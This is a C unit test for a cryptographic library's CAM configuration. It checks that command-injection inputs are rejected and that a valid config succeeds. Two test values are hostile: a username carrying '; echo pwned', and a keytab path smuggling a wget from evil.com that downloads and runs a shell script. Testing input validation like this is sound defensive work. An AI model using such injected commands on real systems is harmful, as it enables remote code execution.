#include "crypto.h"
#include "utest.h"

/**
 * @brief Unit Test: KMC CAM Configs
 **/
UTEST(KMC_CAM, CAM_CONFIG)
{
    int32_t status = CRYPTO_LIB_SUCCESS;
    // Setup & Initialize CryptoLib
    Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
                            IV_CRYPTO_MODULE);
    Crypto_Config_TC(CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR, TC_IGNORE_ANTI_REPLAY_TRUE, TC_IGNORE_SA_STATE_FALSE, 
                     TC_UNIQUE_SA_PER_MAP_ID_FALSE, TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);

    // check username
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,      // cam_enabled
                               "/path/to/cookie",     // cookie_file_path
                               "/etc/krb5.keytab",    // keytab_file_path
                               CAM_LOGIN_KEYTAB_FILE, // login_method
                               "https://example.com", // access_manager_uri
                               "user; echo pwned",    // username (MALICIOUS)
                               "/home/cam");
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);

    // check keytab filepath
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,  // cam_enabled
                               "/path/to/cookie", // cookie_file_path
                               "/etc/krb5.keytab; wget http://evil.com/shell.sh -O /tmp/shell.sh; chmod +x "
                               "/tmp/shell.sh; /tmp/shell.sh", // keytab_file_path (MALICIOUS)
                               CAM_LOGIN_KEYTAB_FILE,          // login_method
                               "https://example.com",          // access_manager_uri
                               "testuser",                     // username
                               "/home/cam"                     // cam_home
    );
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);

    // check good config
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,      // cam_enabled
                               "/path/to/cookie",     // cookie_file_path
                               "/etc/krb5.keytab",    // keytab_file_path
                               CAM_LOGIN_KEYTAB_FILE, // login_method
                               "https://example.com", // access_manager_uri
                               "testuser",            // username
                               "/home/cam"            // cam_home
    );
    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
    printf("Cam Config Status: %d\n", status);

    Crypto_Shutdown();
}
UTEST_MAIN();